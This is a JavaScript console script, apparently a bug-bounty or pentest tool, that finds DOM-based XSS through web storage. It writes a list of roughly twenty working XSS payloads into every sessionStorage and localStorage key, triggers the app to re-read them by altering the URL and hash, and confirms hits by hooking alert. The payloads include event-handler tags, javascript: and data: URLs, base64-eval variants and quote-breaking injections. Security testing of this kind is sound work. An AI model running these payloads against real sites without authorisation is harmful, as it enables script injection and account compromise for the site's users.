console.log("=== Storage DOM XSS Tester — app-driven, alert-confirmed (v2) ===");

(async function(){
const CFG={INJECTION_TIMEOUT_MS:1500,STEP_WAIT:140,MAX_PAYLOADS_PER_KEY:200,DO_RELOAD:false,SKIP_EMPTY_VALUES:true,SHOW_UI:true};
const SOURCES=["sessionStorage","localStorage"];
function rid(){return Math.random().toString(36).slice(2,10)}
function now(){return Date.now()}
function ctxDetect(v){try{const s=(v||"").trim();if(!s)return"plain";if(/^</.test(s))return"html";if(/^javascript:/i.test(s))return"urljs";if(/[<>&'"]/.test(s))return"html";return"plain"}catch(e){return"plain"}}
function mutate(p,nonce,ctx){let r=p;r=r.replace(/alert\s*\([^)]*\)/gi,`alert('XSS:${nonce}')`);r=r.replace(/prompt\s*\([^)]*\)/gi,`alert('XSS:${nonce}')`);r=r.replace(/confirm\s*\([^)]*\)/gi,`alert('XSS:${nonce}')`);if(ctx==="urljs"&&!/^javascript:/i.test(r))r=`javascript:${r}`;if(!/XSS:/.test(r))r+=`/*XSS:${nonce}*/`;return r}
async function nudge(nonce){try{const u=new URL(location.href);u.searchParams.set("_x",nonce);history.replaceState({},"",u.toString());dispatchEvent(new Event("popstate"));const h="#x"+nonce;if(location.hash!==h){location.hash=h;dispatchEvent(new HashChangeEvent("hashchange"))}await new Promise(r=>setTimeout(r,CFG.STEP_WAIT));if(CFG.DO_RELOAD){location.reload();await new Promise(r=>setTimeout(r,600))}}catch(e){}}
const orig={alert:window.alert};window.__xss_alerts=[];
window.alert=function(m){try{window.__xss_alerts.push({msg:String(m),time:now()})}catch(e){};return orig.alert.apply(this,arguments)};
function overlayInit(){if(!CFG.SHOW_UI)return null;const el=document.createElement("div");el.style="position:fixed;z-index:2147483647;font-family:system-ui,Segoe UI,Roboto;background:rgba(0,0,0,.75);color:#0f0;padding:10px 14px;border-radius:10px;bottom:10px;right:10px;box-shadow:0 0 10px rgba(0,255,0,.4);font-size:12px";el.id="xss_overlay";el.textContent="XSS Tester: Starting...";document.body.appendChild(el);return el}
function overlaySet(t){const el=document.getElementById("xss_overlay");if(el)el.textContent=t}
const PAYLOADS=[`<img src=x onerror=alert(1)>`,`<svg/onload=alert(1)>`,`<iframe src='javascript:alert(1)'>`,`'><img src=x onerror=prompt(1)>`,`+123'];alert(1);[[`,`123',alert(1),'`,`123",term:alert(1)//"`,`123";alert\`1\`;//`,`<script>alert(1)</script>`,`<input onfocus=alert(1) autofocus>`,`<details ontoggle=alert\`xss\`><summary>Click</summary></details>`,`<whatever/onpointerover='var a=alert;a(1)'>`,`<svg onload=eval(atob('YWxlcnQoJ1hTUycp'))>`,`<a href='javascript:alert(document.domain)'>XSS</a>`,`<body onpageshow=alert(1)>`,`<audio src=x onerror=alert(1)>`,`<video src=x onerror=alert(1)>`,`javascript:alert(1)`,`"><style>@keyframes x{}</style><div style="animation:x;" onanimationstart="alert(1)">`,`"><img src=x onmouseover=alert(1)>`,`<object data='javascript:alert(1)'>`,`<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>XSS</a>`];
const results=[];let keysTested=0,found=0,tests=0;
const overlay=overlayInit();

async function testKey(src,key,origVal){
const ctx=ctxDetect(origVal),startCount=window.__xss_alerts.length;
let hit=false,tested=0;
for(let i=0;i<PAYLOADS.length&&tested<CFG.MAX_PAYLOADS_PER_KEY;i++){
const nonce=rid(),payload=mutate(PAYLOADS[i],nonce,ctx),t0=now();
try{window[src].setItem(key,payload)}catch(e){}
await nudge(nonce);
await new Promise(r=>setTimeout(r,CFG.STEP_WAIT));
const alerts=window.__xss_alerts.slice(startCount);
for(const a of alerts){if(typeof a.msg==="string"&&a.msg.includes(`XSS:${nonce}`)&&a.time-t0<=CFG.INJECTION_TIMEOUT_MS){
results.push({storage:src,key,context:ctx,payload:PAYLOADS[i],signature:nonce,time:new Date(a.time).toISOString(),note:"executed by app"});hit=true;found++;break}}
if(hit)break;tested++;tests++;}
try{if(origVal==null)window[src].removeItem(key);else window[src].setItem(key,origVal)}catch(e){}
keysTested++;overlaySet(`Keys ${keysTested} • Tests ${tests} • Hits ${found}`);
}

const snapshot={};for(const s of SOURCES){snapshot[s]={};try{for(let i=0;i<window[s].length;i++){const k=window[s].key(i);snapshot[s][k]=window[s].getItem(k)}}catch(e){}}

for(const s of SOURCES){const keys=Object.keys(snapshot[s]||{});for(const k of keys){const v=snapshot[s][k];if(CFG.SKIP_EMPTY_VALUES&&(!v||typeof v!=="string"))continue;await testKey(s,k,v)}}

overlaySet(`Completed • ${found} confirmed alerts`);
console.log("Confirmed:",found);
if(results.length){
console.table(results);
const blob=new Blob([JSON.stringify(results,null,2)],{type:"application/json"});
const url=URL.createObjectURL(blob);
const a=document.createElement("a");
a.href=url;a.download=`xss_confirmed_${Date.now()}.json`;a.click();
setTimeout(()=>URL.revokeObjectURL(url),3000);
}else console.log("No confirmed alert-triggered storage XSS detected.");
window.alert=orig.alert;
setTimeout(()=>{if(overlay)overlay.remove()},3000);
})();



